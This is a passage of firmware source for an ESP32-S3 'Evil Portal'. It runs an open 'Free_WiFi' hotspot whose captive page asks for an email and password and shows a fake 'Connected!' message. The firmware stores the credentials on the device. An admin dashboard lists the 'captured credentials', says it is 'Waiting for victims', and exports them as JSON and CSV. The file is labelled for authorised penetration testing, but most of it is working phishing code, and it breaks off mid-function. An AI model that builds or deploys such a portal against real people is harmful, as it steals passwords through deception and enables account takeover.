// ============================================================================
// ESP32-S3 Captive Portal - v1.1.0
// ============================================================================
// 
// Standalone captive portal with persistent storage, admin panel, and REST API.
// For security research and authorized penetration testing only.
//
// FEATURES:
//   - SPIFFS credential storage (persists across reboots)
//   - Web admin panel with authentication
//   - REST API for integration
//   - JSON/CSV export
//   - Dynamic configuration (no reflash needed)
//   - Samsung auto-popup support
//
// SETUP:
//   Board: ESP32S3 Dev Module
//   ESP32 Core: 2.0.x (NOT 3.x)
//   USB CDC On Boot: Enabled
//   Partition Scheme: Default 4MB with spiffs (or custom)
//
// LIBRARIES NEEDED:
//   - AsyncTCP (github.com/mathieucarbou/AsyncTCP)
//   - ESPAsyncWebServer (github.com/mathieucarbou/ESPAsyncWebServer)
//   - ArduinoJson (install from Library Manager)
//
// ============================================================================

#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>

// ============================================================================
// VERSION INFO
// ============================================================================

#define FIRMWARE_VERSION "1.1.0"
#define MAX_CREDENTIALS 100

// ============================================================================
// DEFAULT CONFIGURATION
// ============================================================================

#define DEFAULT_SSID "Free_WiFi"
#define DEFAULT_ADMIN_USER "admin"
#define DEFAULT_ADMIN_PASS "admin"

// IP Configuration - 4.3.2.1 enables Samsung auto-popup
IPAddress apIP(4, 3, 2, 1);
IPAddress netMsk(255, 255, 255, 0);

// LED Pins (Electronic Cats WiFi Dev Board)
#define LED_ACCENT_PIN 4   // Blue
#define LED_STATUS_PIN 5   // Green  
#define LED_ALERT_PIN  6   // Red

// ============================================================================
// GLOBAL VARIABLES
// ============================================================================

AsyncWebServer server(80);
DNSServer dnsServer;

// Configuration (loaded from SPIFFS)
String portalSSID = DEFAULT_SSID;
String adminUser = DEFAULT_ADMIN_USER;
String adminPass = DEFAULT_ADMIN_PASS;

// Runtime stats
unsigned long bootTime = 0;
int totalCaptures = 0;
int nextCredentialId = 1;

// Rate limiting
unsigned long lastRequestTime = 0;
int requestCount = 0;

// ============================================================================
// HTML TEMPLATES
// ============================================================================

// Captive Portal Login Page
const char portal_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>WiFi Login</title>
    <style>
        * { 
            box-sizing: border-box; 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
        }
        body { 
            margin: 0; 
            padding: 20px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
        }
        h1 { 
            margin: 0 0 10px 0; 
            color: #333;
            font-size: 28px;
            text-align: center;
        }
        .subtitle {
            color: #666;
            text-align: center;
            margin: 0 0 30px 0;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        input[type="email"], 
        input[type="text"], 
        input[type="password"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e1e1;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }
        .success {
            display: none;
            text-align: center;
        }
        .success.show {
            display: block;
        }
        .success h2 {
            color: #10b981;
            font-size: 48px;
            margin: 0;
        }
        .form-container.hide {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="form-container" id="formContainer">
            <h1>🌐 Free WiFi</h1>
            <p class="subtitle">Sign in to connect to the internet</p>
            
            <form id="loginForm">
                <div class="input-group">
                    <label>Email Address</label>
                    <input type="email" name="email" placeholder="your@email.com" required>
                </div>
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter any password" required>
                </div>
                <button type="submit">Connect to WiFi</button>
            </form>
            
            <div class="footer">
                By connecting, you agree to our Terms of Service
            </div>
        </div>
        
        <div class="success" id="successMsg">
            <h2>✓</h2>
            <h3>Connected!</h3>
            <p>You now have internet access.</p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var formData = new FormData(this);
            var params = new URLSearchParams(formData).toString();
            var img = new Image();
            img.src = '/get?' + params;
            document.getElementById('formContainer').classList.add('hide');
            document.getElementById('successMsg').classList.add('show');
        });
    </script>
</body>
</html>
)rawliteral";

// Admin Login Page
const char admin_login_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Admin Login</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f172a;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #e2e8f0;
        }
        .login-card {
            background: #1e293b;
            padding: 40px;
            border-radius: 16px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
            font-size: 24px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #94a3b8;
        }
        input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #334155;
            border-radius: 8px;
            background: #0f172a;
            color: #e2e8f0;
            font-size: 16px;
        }
        input:focus {
            outline: none;
            border-color: #3b82f6;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #3b82f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover { background: #2563eb; }
        .error {
            background: #7f1d1d;
            color: #fecaca;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            display: none;
        }
        .error.show { display: block; }
    </style>
</head>
<body>
    <div class="login-card">
        <h1>🔐 Admin Panel</h1>
        <div class="error" id="error">Invalid credentials</div>
        <form action="/admin/auth" method="POST">
            <div class="input-group">
                <label>Username</label>
                <input type="text" name="username" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Login</button>
        </form>
    </div>
    <script>
        if(window.location.search.includes('error=1')) {
            document.getElementById('error').classList.add('show');
        }
    </script>
</body>
</html>
)rawliteral";

// Admin Dashboard
const char admin_dashboard_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Admin Dashboard</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f172a;
            min-height: 100vh;
            color: #e2e8f0;
        }
        .navbar {
            background: #1e293b;
            padding: 16px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a {
            color: #94a3b8;
            text-decoration: none;
            margin-left: 20px;
            font-size: 14px;
        }
        .navbar a:hover { color: #e2e8f0; }
        .navbar a.active { color: #3b82f6; }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 24px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: #1e293b;
            padding: 24px;
            border-radius: 12px;
            border: 1px solid #334155;
        }
        .stat-card h3 {
            font-size: 14px;
            color: #94a3b8;
            margin-bottom: 8px;
        }
        .stat-card .value {
            font-size: 32px;
            font-weight: 700;
            color: #3b82f6;
        }
        .stat-card .value.green { color: #10b981; }
        .stat-card .value.yellow { color: #f59e0b; }
        .card {
            background: #1e293b;
            border-radius: 12px;
            border: 1px solid #334155;
            margin-bottom: 20px;
        }
        .card-header {
            padding: 16px 24px;
            border-bottom: 1px solid #334155;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .card-header h2 { font-size: 18px; }
        .card-body { padding: 24px; }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 12px 16px;
            text-align: left;
            border-bottom: 1px solid #334155;
        }
        th {
            color: #94a3b8;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
        }
        td { font-size: 14px; }
        .btn {
            padding: 8px 16px;
            border-radius: 6px;
            border: none;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-success { background: #10b981; color: white; }
        .btn:hover { opacity: 0.9; }
        .btn-sm { padding: 6px 12px; font-size: 12px; }
        .warning-box {
            background: #7f1d1d;
            border: 1px solid #991b1b;
            color: #fecaca;
            padding: 16px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .actions { display: flex; gap: 10px; flex-wrap: wrap; }
        .empty-state {
            text-align: center;
            padding: 40px;
            color: #64748b;
        }
        @media (max-width: 768px) {
            .navbar { flex-direction: column; gap: 16px; }
            .navbar nav { display: flex; flex-wrap: wrap; gap: 10px; }
            .navbar a { margin-left: 0; }
            .stats-grid { grid-template-columns: 1fr 1fr; }
            table { font-size: 12px; }
            th, td { padding: 8px; }
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <h1>🎭 Evil Portal Admin</h1>
        <nav>
            <a href="/admin" class="active">Dashboard</a>
            <a href="/admin/logs">Logs</a>
            <a href="/admin/config">Config</a>
            <a href="/admin/export">Export</a>
            <a href="/admin/logout">Logout</a>
        </nav>
    </nav>
    
    <div class="container">
        <div class="warning-box" id="defaultPassWarning" style="display:none;">
            ⚠️ You're using default credentials! Please change them in <a href="/admin/config" style="color:#fecaca;">Config</a>.
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <h3>Total Captures</h3>
                <div class="value" id="totalCaptures">--</div>
            </div>
            <div class="stat-card">
                <h3>Portal SSID</h3>
                <div class="value green" id="ssid" style="font-size:18px;">--</div>
            </div>
            <div class="stat-card">
                <h3>Uptime</h3>
                <div class="value yellow" id="uptime" style="font-size:18px;">--</div>
            </div>
            <div class="stat-card">
                <h3>Free Memory</h3>
                <div class="value" id="memory" style="font-size:18px;">--</div>
            </div>
        </div>
        
        <div class="card">
            <div class="card-header">
                <h2>Recent Captures</h2>
                <a href="/admin/logs" class="btn btn-primary btn-sm">View All</a>
            </div>
            <div class="card-body">
                <table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Time</th>
                            <th>Email</th>
                            <th>Password</th>
                        </tr>
                    </thead>
                    <tbody id="recentLogs">
                        <tr><td colspan="4" class="empty-state">Loading...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
        
        <div class="card">
            <div class="card-header">
                <h2>Quick Actions</h2>
            </div>
            <div class="card-body">
                <div class="actions">
                    <a href="/admin/export?format=json" class="btn btn-success">Export JSON</a>
                    <a href="/admin/export?format=csv" class="btn btn-success">Export CSV</a>
                    <button onclick="clearLogs()" class="btn btn-danger">Clear All Logs</button>
                    <button onclick="rebootDevice()" class="btn btn-danger">Reboot Device</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        function formatTime(ts) {
            if (!ts) return 'N/A';
            var d = new Date(ts * 1000);
            return d.toLocaleString();
        }
        
        function formatUptime(seconds) {
            var h = Math.floor(seconds / 3600);
            var m = Math.floor((seconds % 3600) / 60);
            var s = seconds % 60;
            return h + 'h ' + m + 'm ' + s + 's';
        }
        
        function loadData() {
            fetch('/api/v1/status')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('totalCaptures').textContent = data.credentials_count;
                    document.getElementById('ssid').textContent = data.ssid;
                    document.getElementById('uptime').textContent = formatUptime(data.uptime);
                    document.getElementById('memory').textContent = Math.round(data.memory_free / 1024) + ' KB';
                    
                    if (data.default_creds) {
                        document.getElementById('defaultPassWarning').style.display = 'block';
                    }
                });
            
            fetch('/api/v1/logs?limit=5')
                .then(r => r.json())
                .then(data => {
                    var tbody = document.getElementById('recentLogs');
                    if (data.logs.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="4" class="empty-state">No credentials captured yet</td></tr>';
                        return;
                    }
                    tbody.innerHTML = data.logs.map(log => 
                        '<tr><td>' + log.id + '</td><td>' + formatTime(log.timestamp) + 
                        '</td><td>' + log.email + '</td><td>' + log.password + '</td></tr>'
                    ).join('');
                });
        }
        
        function clearLogs() {
            if (confirm('Are you sure you want to delete ALL captured credentials?')) {
                fetch('/api/v1/logs', { method: 'DELETE' })
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        loadData();
                    });
            }
        }
        
        function rebootDevice() {
            if (confirm('Reboot the device?')) {
                fetch('/api/v1/reboot', { method: 'POST' })
                    .then(() => alert('Rebooting... Please wait 10 seconds.'));
            }
        }
        
        loadData();
        setInterval(loadData, 10000);
    </script>
</body>
</html>
)rawliteral";

// Admin Logs Page
const char admin_logs_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Captured Logs</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f172a;
            min-height: 100vh;
            color: #e2e8f0;
        }
        .navbar {
            background: #1e293b;
            padding: 16px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a {
            color: #94a3b8;
            text-decoration: none;
            margin-left: 20px;
            font-size: 14px;
        }
        .navbar a:hover { color: #e2e8f0; }
        .navbar a.active { color: #3b82f6; }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 24px;
        }
        .toolbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .toolbar h2 { font-size: 24px; }
        .card {
            background: #1e293b;
            border-radius: 12px;
            border: 1px solid #334155;
            overflow-x: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 600px;
        }
        th, td {
            padding: 14px 16px;
            text-align: left;
            border-bottom: 1px solid #334155;
        }
        th {
            color: #94a3b8;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            background: #0f172a;
        }
        td { font-size: 14px; }
        tr:hover { background: #334155; }
        .btn {
            padding: 8px 16px;
            border-radius: 6px;
            border: none;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn:hover { opacity: 0.9; }
        .btn-sm { padding: 6px 12px; font-size: 12px; }
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #64748b;
        }
        .refresh-toggle {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #94a3b8;
            font-size: 14px;
        }
        .actions { display: flex; gap: 10px; }
        @media (max-width: 768px) {
            .navbar { flex-direction: column; gap: 16px; }
            .navbar nav { display: flex; flex-wrap: wrap; gap: 10px; }
            .navbar a { margin-left: 0; }
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <h1>🎭 Evil Portal Admin</h1>
        <nav>
            <a href="/admin">Dashboard</a>
            <a href="/admin/logs" class="active">Logs</a>
            <a href="/admin/config">Config</a>
            <a href="/admin/export">Export</a>
            <a href="/admin/logout">Logout</a>
        </nav>
    </nav>
    
    <div class="container">
        <div class="toolbar">
            <h2>Captured Credentials</h2>
            <div class="actions">
                <label class="refresh-toggle">
                    <input type="checkbox" id="autoRefresh" checked>
                    Auto-refresh (10s)
                </label>
                <button onclick="loadLogs()" class="btn btn-primary btn-sm">Refresh Now</button>
                <button onclick="clearAll()" class="btn btn-danger btn-sm">Clear All</button>
            </div>
        </div>
        
        <div class="card">
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Date/Time</th>
                        <th>Email/Username</th>
                        <th>Password</th>
                        <th>Client IP</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="logsTable">
                    <tr><td colspan="6" class="empty-state">Loading...</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        var refreshInterval;
        
        function formatTime(ts) {
            if (!ts) return 'N/A';
            var d = new Date(ts * 1000);
            return d.toLocaleString();
        }
        
        function loadLogs() {
            fetch('/api/v1/logs')
                .then(r => r.json())
                .then(data => {
                    var tbody = document.getElementById('logsTable');
                    if (data.logs.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No credentials captured yet. Waiting for victims...</td></tr>';
                        return;
                    }
                    tbody.innerHTML = data.logs.map(log => 
                        '<tr>' +
                        '<td>' + log.id + '</td>' +
                        '<td>' + formatTime(log.timestamp) + '</td>' +
                        '<td>' + escapeHtml(log.email) + '</td>' +
                        '<td>' + escapeHtml(log.password) + '</td>' +
                        '<td>' + (log.client_ip || 'N/A') + '</td>' +
                        '<td><button onclick="deleteLog(' + log.id + ')" class="btn btn-danger btn-sm">Delete</button></td>' +
                        '</tr>'
                    ).join('');
                });
        }
        
        function escapeHtml(text) {
            var div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function deleteLog(id) {
            if (confirm('Delete this entry?')) {
                fetch('/api/v1/logs/' + id, { method: 'DELETE' })
                    .then(r => r.json())
                    .then(data => {
                        loadLogs();
                    });
            }
        }
        
        function clearAll() {
            if (confirm('Are you sure you want to delete ALL captured credentials? This cannot be undone.')) {
                fetch('/api/v1/logs', { method: 'DELETE' })
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        loadLogs();
                    });
            }
        }
        
        function toggleAutoRefresh() {
            if (document.getElementById('autoRefresh').checked) {
                refreshInterval = setInterval(loadLogs, 10000);
            } else {
                clearInterval(refreshInterval);
            }
        }
        
        document.getElementById('autoRefresh').addEventListener('change', toggleAutoRefresh);
        loadLogs();
        toggleAutoRefresh();
    </script>
</body>
</html>
)rawliteral";

// Admin Config Page
const char admin_config_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Configuration</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f172a;
            min-height: 100vh;
            color: #e2e8f0;
        }
        .navbar {
            background: #1e293b;
            padding: 16px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a {
            color: #94a3b8;
            text-decoration: none;
            margin-left: 20px;
            font-size: 14px;
        }
        .navbar a:hover { color: #e2e8f0; }
        .navbar a.active { color: #3b82f6; }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 24px;
        }
        .card {
            background: #1e293b;
            border-radius: 12px;
            border: 1px solid #334155;
            margin-bottom: 20px;
        }
        .card-header {
            padding: 16px 24px;
            border-bottom: 1px solid #334155;
        }
        .card-header h2 { font-size: 18px; }
        .card-body { padding: 24px; }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #94a3b8;
        }
        input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #334155;
            border-radius: 8px;
            background: #0f172a;
            color: #e2e8f0;
            font-size: 16px;
        }
        input:focus {
            outline: none;
            border-color: #3b82f6;
        }
        .help-text {
            font-size: 12px;
            color: #64748b;
            margin-top: 6px;
        }
        .btn {
            padding: 12px 24px;
            border-radius: 8px;
            border: none;
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        .btn-primary { background: #3b82f6; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn:hover { opacity: 0.9; }
        .btn-block { width: 100%; }
        .success-msg {
            background: #064e3b;
            border: 1px solid #10b981;
            color: #6ee7b7;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: none;
        }
        .success-msg.show { display: block; }
        .divider {
            height: 1px;
            background: #334155;
            margin: 20px 0;
        }
        @media (max-width: 768px) {
            .navbar { flex-direction: column; gap: 16px; }
            .navbar nav { display: flex; flex-wrap: wrap; gap: 10px; }
            .navbar a { margin-left: 0; }
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <h1>🎭 Evil Portal Admin</h1>
        <nav>
            <a href="/admin">Dashboard</a>
            <a href="/admin/logs">Logs</a>
            <a href="/admin/config" class="active">Config</a>
            <a href="/admin/export">Export</a>
            <a href="/admin/logout">Logout</a>
        </nav>
    </nav>
    
    <div class="container">
        <div class="success-msg" id="successMsg">Configuration saved successfully!</div>
        
        <div class="card">
            <div class="card-header">
                <h2>Portal Settings</h2>
            </div>
            <div class="card-body">
                <form id="portalForm">
                    <div class="form-group">
                        <label>WiFi Network Name (SSID)</label>
                        <input type="text" name="ssid" id="ssid" maxlength="32" required>
                        <p class="help-text">This is the network name victims will see. Max 32 characters.</p>
                    </div>
                    <button type="submit" class="btn btn-primary btn-block">Save Portal Settings</button>
                </form>
            </div>
        </div>
        
        <div class="card">
            <div class="card-header">
                <h2>Admin Credentials</h2>
            </div>
            <div class="card-body">
                <form id="adminForm">
                    <div class="form-group">
                        <label>Admin Username</label>
                        <input type="text" name="admin_user" id="admin_user" required>
                    </div>
                    <div class="form-group">
                        <label>Admin Password</label>
                        <input type="password" name="admin_pass" id="admin_pass" required>
                        <p class="help-text">Used to access this admin panel.</p>
                    </div>
                    <button type="submit" class="btn btn-primary btn-block">Update Credentials</button>
                </form>
            </div>
        </div>
        
        <div class="card">
            <div class="card-header">
                <h2>Device Control</h2>
            </div>
            <div class="card-body">
                <button onclick="rebootDevice()" class="btn btn-danger btn-block">Reboot Device</button>
                <p class="help-text" style="margin-top:10px;">Device will restart. You'll need to reconnect to the portal.</p>
            </div>
        </div>
    </div>

    <script>
        function loadConfig() {
            fetch('/api/v1/config')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('ssid').value = data.ssid;
                    document.getElementById('admin_user').value = data.admin_user;
                });
        }
        
        function showSuccess() {
            var msg = document.getElementById('successMsg');
            msg.classList.add('show');
            setTimeout(() => msg.classList.remove('show'), 3000);
        }
        
        document.getElementById('portalForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var formData = new FormData(this);
            fetch('/api/v1/config', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ssid: formData.get('ssid') })
            })
            .then(r => r.json())
            .then(data => {
                showSuccess();
                if (data.restart_required) {
                    alert('SSID changed. Device will restart in 3 seconds.');
                    setTimeout(() => {
                        fetch('/api/v1/reboot', { method: 'POST' });
                    }, 1000);
                }
            });
        });
        
        document.getElementById('adminForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var formData = new FormData(this);
            fetch('/api/v1/config', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    admin_user: formData.get('admin_user'),
                    admin_pass: formData.get('admin_pass')
                })
            })
            .then(r => r.json())
            .then(data => {
                showSuccess();
                alert('Admin credentials updated. Please login again.');
                window.location.href = '/admin/logout';
            });
        });
        
        function rebootDevice() {
            if (confirm('Reboot the device now?')) {
                fetch('/api/v1/reboot', { method: 'POST' })
                    .then(() => alert('Rebooting... Please wait 10 seconds and reconnect.'));
            }
        }
        
        loadConfig();
    </script>
</body>
</html>
)rawliteral";

// Admin Export Page
const char admin_export_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Export Data</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f172a;
            min-height: 100vh;
            color: #e2e8f0;
        }
        .navbar {
            background: #1e293b;
            padding: 16px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
        }
        .navbar h1 { font-size: 20px; }
        .navbar a {
            color: #94a3b8;
            text-decoration: none;
            margin-left: 20px;
            font-size: 14px;
        }
        .navbar a:hover { color: #e2e8f0; }
        .navbar a.active { color: #3b82f6; }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 24px;
        }
        .card {
            background: #1e293b;
            border-radius: 12px;
            border: 1px solid #334155;
            margin-bottom: 20px;
        }
        .card-header {
            padding: 16px 24px;
            border-bottom: 1px solid #334155;
        }
        .card-header h2 { font-size: 18px; }
        .card-body { padding: 24px; }
        .export-option {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px;
            background: #0f172a;
            border-radius: 8px;
            margin-bottom: 12px;
        }
        .export-option:last-child { margin-bottom: 0; }
        .export-info h3 {
            font-size: 16px;
            margin-bottom: 4px;
        }
        .export-info p {
            font-size: 12px;
            color: #64748b;
        }
        .btn {
            padding: 10px 20px;
            border-radius: 8px;
            border: none;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        .btn-success { background: #10b981; color: white; }
        .btn:hover { opacity: 0.9; }
        .stats {
            text-align: center;
            padding: 20px;
            background: #0f172a;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .stats .number {
            font-size: 48px;
            font-weight: 700;
            color: #3b82f6;
        }
        .stats .label {
            color: #64748b;
            font-size: 14px;
        }
        @media (max-width: 768px) {
            .navbar { flex-direction: column; gap: 16px; }
            .navbar nav { display: flex; flex-wrap: wrap; gap: 10px; }
            .navbar a { margin-left: 0; }
            .export-option { flex-direction: column; gap: 12px; text-align: center; }
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <h1>🎭 Evil Portal Admin</h1>
        <nav>
            <a href="/admin">Dashboard</a>
            <a href="/admin/logs">Logs</a>
            <a href="/admin/config">Config</a>
            <a href="/admin/export" class="active">Export</a>
            <a href="/admin/logout">Logout</a>
        </nav>
    </nav>
    
    <div class="container">
        <div class="card">
            <div class="card-header">
                <h2>Export Captured Data</h2>
            </div>
            <div class="card-body">
                <div class="stats">
                    <div class="number" id="totalCount">--</div>
                    <div class="label">credentials available for export</div>
                </div>
                
                <div class="export-option">
                    <div class="export-info">
                        <h3>📄 JSON Format</h3>
                        <p>Structured data for applications and APIs</p>
                    </div>
                    <a href="/api/v1/export/json" class="btn btn-success" download>Download JSON</a>
                </div>
                
                <div class="export-option">
                    <div class="export-info">
                        <h3>📊 CSV Format</h3>
                        <p>Spreadsheet compatible (Excel, Google Sheets)</p>
                    </div>
                    <a href="/api/v1/export/csv" class="btn btn-success" download>Download CSV</a>
                </div>
            </div>
        </div>
    </div>

    <script>
        fetch('/api/v1/status')
            .then(r => r.json())
            .then(data => {
                document.getElementById('totalCount').textContent = data.credentials_count;
            });
    </script>
</body>
</html>
)rawliteral";

// ============================================================================
// LED FUNCTIONS
// ============================================================================

void setupLED() {
    if (LED_ACCENT_PIN >= 0) pinMode(LED_ACCENT_PIN, OUTPUT);
    if (LED_STATUS_PIN >= 0) pinMode(LED_STATUS_PIN, OUTPUT);
    if (LED_ALERT_PIN >= 0) pinMode(LED_ALERT_PIN, OUTPUT);
}

void setLED(bool accent, bool status, bool alert) {
    if (LED_ACCENT_PIN >= 0) digitalWrite(LED_ACCENT_PIN, accent ? LOW : HIGH);
    if (LED_STATUS_PIN >= 0) digitalWrite(LED_STATUS_PIN, status ? LOW : HIGH);
    if (LED_ALERT_PIN >= 0) digitalWrite(LED_ALERT_PIN, alert ? LOW : HIGH);
}

void ledStarting() { setLED(true, false, false); }
void ledReady()    { setLED(false, true, false); }
void ledCapture()  { setLED(false, false, true); }

void blinkAlert(int times) {
    for (int i = 0; i < times; i++) {
        ledCapture();
        delay(200);
        ledReady();
        delay(200);
    }
}

// ============================================================================
// SPIFFS FUNCTIONS
// ============================================================================

bool initSPIFFS() {
    if (!SPIFFS.begin(true)) {
        Serial.println("[!] SPIFFS mount failed");
        return false;
    }
    Serial.println("[+] SPIFFS mounted");
    
    // Initialize config file if it doesn't exist
    if (!SPIFFS.exists("/config.json")) {
        saveConfig();
    }
    
    // Initialize logs file if it doesn't exist
    if (!SPIFFS.exists("/logs.json")) {
        File f = SPIFFS.open("/logs.json", "w");
        if (f) {
            f.println("{\"logs\":[]}");
            f.close();
        }
    }
    
    loadConfig();
    loadCredentialCount();
    
    return true;
}

void loadConfig() {
    File f = SPIFFS.open("/config.json", "r");
    if (!f) return;
    
    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, f);
    f.close();
    
    if (error) {
        Serial.println("[!] Config parse error");
        return;
    }
    
    if (doc["ssid"].is<const char*>()) {
        portalSSID = doc["ssid"].as<String>();
    }
    if (doc["admin_user"].is<const char*>()) {
        adminUser = doc["admin_user"].as<String>();
    }
    if (doc["admin_pass"].is<const char*>()) {
        adminPass = doc["admin_pass"].as<String>();
    }
    if (doc["next_id"].is<int>()) {
